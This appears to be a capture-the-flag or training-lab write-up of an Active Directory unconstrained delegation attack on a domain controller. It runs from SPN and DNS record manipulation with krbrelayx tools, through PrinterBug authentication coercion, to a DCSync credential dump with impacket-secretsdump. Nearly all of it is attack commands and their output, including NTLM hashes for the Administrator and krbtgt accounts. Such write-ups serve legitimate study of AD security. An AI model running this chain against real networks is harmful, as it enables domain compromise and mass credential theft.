## DCORP-DC Unconstrained Delegation Abuse ##

- Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 addspn.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -s HOST/WS01.DOLLARCORP.MONEYCORP.LOCAL DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

- Query the DC to verify that the SPN has been modified.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 addspn.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -q DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=DCORP-APPSRV,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local - STATUS: Read - READ TIME: 2023-08-06T20:24:38.930703
    dNSHostName: dcorp-appsrv.dollarcorp.moneycorp.local
    msDS-AdditionalDnsHostName: WS01.DOLLARCORP.MONEYCORP.LOCAL
    sAMAccountName: DCORP-APPSRV$
    servicePrincipalName: TERMSRV/WS01
                          TERMSRV/WS01.DOLLARCORP.MONEYCORP.LOCAL
                          RestrictedKrbHost/WS01
                          HOST/WS01
                          RestrictedKrbHost/WS01.DOLLARCORP.MONEYCORP.LOCAL
                          HOST/WS01.DOLLARCORP.MONEYCORP.LOCAL
                          TERMSRV/DCORP-APPSRV
                          TERMSRV/dcorp-appsrv.dollarcorp.moneycorp.local
                          RestrictedKrbHost/DCORP-APPSRV
                          HOST/DCORP-APPSRV
                          RestrictedKrbHost/dcorp-appsrv.dollarcorp.moneycorp.local
                          HOST/dcorp-appsrv.dollarcorp.moneycorp.local
```

- Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 dnstool.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -r 'WS01.DOLLARCORP.MONEYCORP.LOCAL' -d 172.16.99.3 172.16.2.1 --action add -t A          
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

- Verify that the DNS entry has been correctly set.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 dnstool.py -u 'dollarcorp.moneycorp.local\DCORP-APPSRV$' -p aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 -r 'WS01.DOLLARCORP.MONEYCORP.LOCAL' -d 172.16.99.3 --action query 'DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL' 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record WS01
DC=WS01,DC=dollarcorp.moneycorp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=dollarcorp,DC=moneycorp,DC=local
[+] Record entry:
 - Type: 1 (A) (Serial: 132)
 - Address: 172.16.99.3
```

- Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 krbrelayx.py -aesKey f5ae52b9f36f1e41b2f0c59a3c18aa4367c27c3e1a450ef4d4df010210d054cd
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

- Authentication coercion via PrinterBug.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# python3 printerbug.py 'dollarcorp.moneycorp.local/DCORP-APPSRV$@DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL' -hashes aad3b435b51404eeaad3b435b51404ee:b4cb7bf8b93c78b8051c7906bb054dc5 WS01.DOLLARCORP.MONEYCORP.LOCAL
[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

```
<snip>

[*] SMBD: Received connection from 172.16.2.1
[*] Got ticket for DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL [krbtgt@DOLLARCORP.MONEYCORP.LOCAL]
[*] Saving ticket in DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt@DOLLARCORP.MONEYCORP.LOCAL.ccache
[*] SMBD: Received connection from 172.16.2.1
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 172.16.2.1
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

- Rename the ST
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# mv DCORP-DC\$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt@DOLLARCORP.MONEYCORP.LOCAL.ccache dcorp.ccache
```

- Loot the DC
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# export KRB5CCNAME=dcorp.ccache
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# impacket-secretsdump 'dollarcorp.moneycorp.local/dcorp-dc$'@DCORP-DC -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:af0686cc0ca8f04df42210c9ac980760:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e9815869d2090ccfca61c1fe0d23986:::
sqladmin\sqladmin:1113:aad3b435b51404eeaad3b435b51404ee:07e8be316e3da9a042a9cb681df19bf5:::
websvc\websvc:1114:aad3b435b51404eeaad3b435b51404ee:cc098f204c5887eaa8253e7c2749156f:::
srvadmin\srvadmin:1115:aad3b435b51404eeaad3b435b51404ee:a98e18228819e8eec3dfa33cb68b0728:::
appadmin\appadmin:1117:aad3b435b51404eeaad3b435b51404ee:d549831a955fee51a43c83efb3928fa7:::
svcadmin\svcadmin:1118:aad3b435b51404eeaad3b435b51404ee:b38ff50264b74508085d82c69794a4d8:::
testda\testda:1119:aad3b435b51404eeaad3b435b51404ee:a16452f790729fa34e8f3a08f234a82c:::
mgmtadmin\mgmtadmin:1120:aad3b435b51404eeaad3b435b51404ee:95e2cd7ff77379e34c6e46265e75d754:::
ciadmin\ciadmin:1121:aad3b435b51404eeaad3b435b51404ee:e08253add90dccf1a208523d02998c3d:::
sql1admin\sql1admin:1122:aad3b435b51404eeaad3b435b51404ee:e999ae4bd06932620a1e78d2112138c6:::

<snip>
```